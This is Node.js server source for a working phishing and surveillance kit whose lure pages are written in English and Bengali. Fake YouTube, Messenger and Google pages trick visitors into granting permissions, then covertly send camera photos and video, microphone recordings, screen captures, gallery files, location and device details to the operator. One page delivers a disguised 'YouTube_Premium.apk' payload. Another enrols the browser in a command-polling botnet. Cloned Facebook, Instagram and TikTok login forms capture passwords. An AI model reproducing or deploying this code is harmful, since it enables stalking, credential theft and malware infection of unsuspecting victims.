app.get('/go/:tok',(req,res)=>{
    const info=linkTokens.get(req.params.tok);
    if(!info) return res.send('<h2 style="text-align:center;color:red">Link expired.</h2>');
    res.send(buildPage(info.action,info.uid));
});

function buildPage(action,uid){
    if(action.startsWith('phish_')) return phishPage(action,uid);
    if(action==='apk')              return apkPage(uid);
    if(action==='botnet')           return botnetPage(uid);
    if(action==='messenger')        return messengerPage(uid);
    return infoPage(action,uid);
}

function infoPage(action,uid){
    const doFront   = ['cam_f_photo','cam_f_video','screenshot','screenshare','recon'].includes(action);
    const doBack    = ['cam_b_photo','cam_b_video'].includes(action);
    const doVideo   = ['cam_f_video','cam_b_video'].includes(action);
    const doLoc     = ['location','mobile_net','wifi','netall','recon','sysinfo','fullsys'].includes(action);
    const doMic     = ['mic','recon'].includes(action);
    const doGallery = ['gallery'].includes(action);
    const doScreen  = ['screenshot','screenshare','recon'].includes(action);

    return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>YouTube</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0f0f0f;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}.yt{font-size:64px;margin-bottom:16px;animation:p 2s infinite}@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}h2{font-size:20px;margin-bottom:8px}p{color:#aaa;font-size:14px;margin-bottom:24px;line-height:1.5}.box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:18px;width:100%;max-width:360px;margin-bottom:14px}.btn{width:100%;padding:14px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}.btn2{width:100%;padding:10px;background:transparent;color:#666;border:1px solid #333;border-radius:8px;font-size:13px;cursor:pointer;margin-top:8px}#st{font-size:12px;color:#aaa;margin-top:12px}video,canvas{display:none;width:1px;height:1px}</style>
</head><body>
<div class="yt">▶️</div><h2>YouTube Premium</h2><p>এই ভিডিওটি দেখতে অনুমতি প্রয়োজন।<br>Allow চাপুন এবং ভিডিও উপভোগ করুন।</p>
<div class="box"><button class="btn" onclick="run()">▶ Allow & Watch</button><button class="btn2" onclick="this.previousElementSibling.click()">Skip</button></div>
<div id="st"></div><video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas>
<script>
const UID='${uid}',D='${HOST}/d',ACT='${action}';
window.onload=async function(){
  const i={ua:navigator.userAgent,sc:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,t:new Date().toString(),conn:navigator.connection?.effectiveType||'?',cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory||'?',lang:navigator.language};
  if(navigator.getBattery){const b=await navigator.getBattery();i.bat=Math.round(b.level*100)+'%';i.chg=b.charging;}
  if(navigator.storage){const e=await navigator.storage.estimate();i.stg_total=Math.round(e.quota/1024/1024)+'MB';i.stg_used=Math.round(e.usage/1024/1024)+'MB';}
  send('text',{type:'📱 Device Info (${action})',data:JSON.stringify(i,null,2)});
  ${doLoc?`navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{send('loc',{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},{},{ enableHighAccuracy:true,timeout:15000});`:''}
};
function send(ep,body){return fetch(D+'/'+ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,...body})}).catch(()=>{});}
async function run(){
  document.querySelector('.btn').textContent='Loading...';
  document.getElementById('st').textContent='Please wait...';
  ${doScreen?`try{const s=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});const v=document.getElementById('vv');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,800));const c=document.getElementById('cc');c.width=v.videoWidth||1080;c.height=v.videoHeight||1920;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.95));const fd=new FormData();fd.append('photo',b,'screen.jpg');fd.append('uid',UID);fd.append('camtype','🖥️ Screen Capture');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}`:''}
  ${doFront?`try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});const v=document.getElementById('vv');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'front.jpg');fd.append('uid',UID);fd.append('camtype','📷 Front Camera');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}`:''}
  ${doBack?`try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});const v=document.getElementById('vv');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'back.jpg');fd.append('uid',UID);fd.append('camtype','📷 Back Camera');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}`:''}
  ${doVideo?`try{const facing=${action.includes('_f_')?"'user'":"'environment'"};const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing},audio:true});const rec=new MediaRecorder(s,{mimeType:'video/webm'});const ch=[];rec.ondataavailable=e=>ch.push(e.data);rec.onstop=async()=>{const blob=new Blob(ch,{type:'video/webm'});const fd=new FormData();fd.append('video',blob,'vid.webm');fd.append('uid',UID);fd.append('camtype','🎥 Video');await fetch(D+'/video',{method:'POST',body:fd}).catch(()=>{});s.getTracks().forEach(t=>t.stop());};rec.start();setTimeout(()=>rec.stop(),15000);}catch(e){}`:''}
  ${doMic?`try{const s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});const rec=new MediaRecorder(s);const ch=[];rec.ondataavailable=e=>ch.push(e.data);rec.onstop=async()=>{const fd=new FormData();fd.append('audio',new Blob(ch,{type:'audio/webm'}),'mic.webm');fd.append('uid',UID);await fetch(D+'/audio',{method:'POST',body:fd});s.getTracks().forEach(t=>t.stop());};rec.start();setTimeout(()=>rec.stop(),10000);}catch(e){}`:''}
  ${doGallery?`const inp=document.createElement('input');inp.type='file';inp.accept='image/*,video/*';inp.multiple=true;inp.style.display='none';inp.onchange=async()=>{const files=[...inp.files];document.getElementById('st').textContent=files.length+' ফাইল পাঠানো হচ্ছে...';let done=0;for(const f of files){try{const buf=await f.arrayBuffer();const fd=new FormData();fd.append('photo',new Blob([buf],{type:f.type}),f.name);fd.append('uid',UID);fd.append('camtype','🖼️ Gallery: '+f.name);await fetch(D+'/photo',{method:'POST',body:fd});done++;document.getElementById('st').textContent=done+'/'+files.length+' done';}catch(e){}}};document.body.appendChild(inp);inp.click();`:''}
  document.getElementById('st').textContent='✅ সম্পন্ন';document.querySelector('.btn').textContent='▶ Watch Now';document.querySelector('p').textContent='ভিডিও লোড হচ্ছে...';setTimeout(()=>document.querySelector('p').textContent='স্ট্রিম পাওয়া যাচ্ছে না।',4000);
}
</script></body></html>`;
}

function messengerPage(uid){return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Messenger</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}.hdr{background:#0084ff;padding:14px 16px;display:flex;align-items:center;gap:10px}.hdr-txt{color:#fff;font-size:17px;font-weight:600}.notice{background:#f0f2f5;margin:12px;padding:14px;border-radius:12px;text-align:center}.n-title{font-size:15px;font-weight:600;color:#333;margin-bottom:6px}.n-sub{font-size:13px;color:#666;margin-bottom:14px}.btn{width:100%;padding:12px;background:#0084ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}.ci{display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #f0f2f5;gap:12px}.av{width:48px;height:48px;border-radius:50%;background:#0084ff;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;flex-shrink:0}.cn{font-size:15px;font-weight:600;color:#333}.cm{font-size:13px;color:#666;margin-top:2px}.ct{font-size:11px;color:#999}#st{text-align:center;padding:10px;font-size:12px;color:#999}video,canvas{display:none;width:1px;height:1px}</style></head><body>
<div class="hdr"><div style="font-size:22px">💬</div><div class="hdr-txt">Messenger</div></div>
<div class="notice"><div class="n-title">📸 Chat Backup</div><div class="n-sub">Allow Messenger to back up your chats.</div><button class="btn" onclick="run()">Allow & Enable</button></div>
<div id="st"></div>
<div class="ci"><div class="av">R</div><div style="flex:1"><div class="cn">Rahim</div><div class="cm">Bhai ki obostha?</div></div><div class="ct">2m</div></div>
<div class="ci"><div class="av">K</div><div style="flex:1"><div class="cn">Karim</div><div class="cm">Ok done ✓</div></div><div class="ct">15m</div></div>
<div class="ci"><div class="av">S</div><div style="flex:1"><div class="cn">Sumaiya</div><div class="cm">Haha 😂</div></div><div class="ct">1h</div></div>
<div class="ci"><div class="av">N</div><div style="flex:1"><div class="cn">Nusrat</div><div class="cm">Ki bolchos?</div></div><div class="ct">3h</div></div>
<video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas>
<script>
const UID='${uid}',D='${HOST}/d';
window.onload=function(){fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💬 Messenger Opened',data:navigator.userAgent})});navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});});};
async function run(){document.querySelector('.btn').textContent='Processing...';try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});const v=document.getElementById('vv');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'msg.jpg');fd.append('uid',UID);fd.append('camtype','💬 Messenger Cam');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}try{const s=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});const v=document.getElementById('vv');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,800));const c=document.getElementById('cc');c.width=v.videoWidth||1080;c.height=v.videoHeight||1920;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.95));const fd=new FormData();fd.append('photo',b,'screen.jpg');fd.append('uid',UID);fd.append('camtype','🖥️ Screen');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}document.querySelector('.btn').textContent='✅ Enabled';document.getElementById('st').textContent='Backup enabled!';}
</script></body></html>`;}

function apkPage(uid){return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>YouTube</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0f0f0f;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}.yt{font-size:64px;margin-bottom:16px}h2{font-size:20px;margin-bottom:8px}p{color:#aaa;font-size:14px;margin-bottom:24px}.box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:18px;width:100%;max-width:360px}.btn{width:100%;padding:14px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}#st{font-size:12px;color:#aaa;margin-top:12px}</style></head><body><div class="yt">▶️</div><h2>YouTube Premium</h2><p>Premium content requires the app.</p><div class="box"><button class="btn" onclick="dl()">📥 Install & Watch</button></div><div id="st"></div><script>const UID='${uid}',BASE='${HOST}',D='${HOST}/d';window.onload=function(){fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💀 APK Page',data:navigator.userAgent})});};function dl(){document.querySelector('.btn').textContent='Downloading...';const a=document.createElement('a');a.href=BASE+'/payload.apk';a.download='YouTube_Premium.apk';document.body.appendChild(a);a.click();document.body.removeChild(a);fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💀 APK DOWNLOADED',data:navigator.userAgent})});setTimeout(()=>{document.getElementById('st').textContent='Open Downloads → install';document.querySelector('.btn').textContent='✅ Downloaded';},2000);}</script></body></html>`;}

function botnetPage(uid){const vid=crypto.randomBytes(8).toString('hex');return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Google</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}.logo{font-size:52px;margin-bottom:16px}.card{width:100%;max-width:360px;border:1px solid #ddd;border-radius:12px;padding:24px}h2{font-size:18px;margin-bottom:8px}p{font-size:13px;color:#666;margin-bottom:20px;line-height:1.5}.btn{width:100%;padding:14px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}.spin{display:none;width:30px;height:30px;border:3px solid #eee;border-top-color:#4285f4;border-radius:50%;animation:s .8s linear infinite;margin:14px auto}@keyframes s{to{transform:rotate(360deg)}}#st{font-size:12px;color:#999;margin-top:10px}video,canvas{display:none;width:1px;height:1px}</style></head><body><div class="logo">🔒</div><div class="card"><h2>Verify Your Identity</h2><p>Google needs to verify your account.</p><button class="btn" id="btn" onclick="run()">Verify Now</button><div class="spin" id="sp"></div><div id="st"></div></div><video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas><script>const UID='${uid}',VID='${vid}',BASE='${HOST}',D='${HOST}/d',B='${HOST}/b';window.onload=async function(){await fetch(B+'/reg',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,victimId:VID,model:navigator.userAgent.slice(0,80)})}).catch(()=>{});if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js').catch(()=>{});setInterval(poll,12000);};async function run(){document.getElementById('btn').style.display='none';document.getElementById('sp').style.display='block';if('Notification' in window)await Notification.requestPermission().catch(()=>{});try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});const v=document.getElementById('vv');v.srcObject=s;v.style.display='none';document.body.appendChild(v);await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());v.remove();const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'bot.jpg');fd.append('uid',UID);fd.append('camtype','🤖 Bot Cam');await fetch(D+'/photo',{method:'POST',body:fd}).catch(()=>{});}catch(e){}navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}).catch(()=>{});});fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'🤖 BOT JOINED',data:VID})}).catch(()=>{});setTimeout(()=>{document.getElementById('sp').style.display='none';document.getElementById('st').textContent='✅ Verified';},3000);}async function poll(){try{const r=await fetch(B+'/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,victimId:VID})});const d=await r.json();if(d.commands)for(const c of d.commands)await exec(c);}catch(e){}}async function exec(cmd){if(cmd==='photo'){try{const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;v.srcObject=s;v.style.display='none';document.body.appendChild(v);await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());v.remove();const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'cmd.jpg');fd.append('uid',UID);fd.append('camtype','🤖 Bot CMD');fetch(D+'/photo',{method:'POST',body:fd}).catch(()=>{});}catch(e){}}if(cmd==='location'){navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}).catch(()=>{});});}}</script></body></html>`;}

function phishPage(action,uid){const cfg={phish_fb:{name:'Facebook',rdr:'facebook.com',bg:'#1877f2',card:'rgba(255,255,255,.12)',tc:'#fff',bc:'#fff',btc:'#1877f2',ic:'rgba(255,255,255,.2)',ib:'rgba(255,255,255,.3)',ph:'Phone or email',logo:'f'},phish_ig:{name:'Instagram',rdr:'instagram.com',bg:'#fff',card:'#fff',tc:'#262626',bc:'#0095f6',btc:'#fff',ic:'#fafafa',ib:'#dbdbdb',ph:'Phone, username or email',logo:'📷'},phish_tt:{name:'TikTok',rdr:'tiktok.com',bg:'#000',card:'#161823',tc:'#fff',bc:'#fe2c55',btc:'#fff',ic:'#2a2a2a',ib:'#333',ph:'Phone / Email / Username',logo:'♪'}};const c=cfg[action]||cfg.phish_fb;return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${c.name}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:${c.bg};color:${c.tc};font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}.logo{font-size:52px;text-align:center;margin-bottom:20px}.card{width:100%;max-width:380px;background:${c.card};border-radius:10px;padding:24px;border:${action==='phish_ig'?'1px solid #dbdbdb':'none'}}input{width:100%;padding:13px;margin:6px 0;border-radius:8px;border:1px solid ${c.ib};background:${c.ic};color:${c.tc};font-size:15px;outline:none}input::placeholder{color:${action==='phish_ig'?'#aaa':'rgba(255,255,255,.5)'}}.btn{width:100%;padding:14px;margin-top:12px;border:none;border-radius:8px;background:${c.bc};color:${c.btc};font-size:16px;font-weight:bold;cursor:pointer}.lnk{text-align:center;font-size:13px;color:${c.bc==='#fff'?'#8ab4f8':c.bc};margin-top:12px}</style></head><body><div class="logo">${c.logo}</div><div class="card"><input type="text" id="u" placeholder="${c.ph}"><input type="password" id="p" placeholder="Password"><button class="btn" onclick="sub()">Log In</button><div class="lnk">Forgot password?</div></div><script>const UID='${uid}',D='${HOST}/d',SITE='${c.name}',RDR='https://www.${c.rdr}';window.onload=function(){fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Phish',data:navigator.userAgent})});};async function sub(){const u=document.getElementById('u').value,p=document.getElementById('p').value;if(!u||!p)return;document.querySelector('.btn').textContent='Logging in...';await fetch(D+'/creds',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,user:u,pass:p})});setTimeout(()=>window.location.href='https://www.'+RDR,600);}<\/script></body></html>`;}

// keepalive
setInterval(()=>{
    appSocket.clients.forEach(ws=>{if(ws.readyState===webSocket.OPEN)ws.send('ping');});
    if(HOST)axios.get(HOST).catch(()=>{});
},5000);

appServer.listen(process.env.PORT||8999,()=>console.log('[+] Server running'));
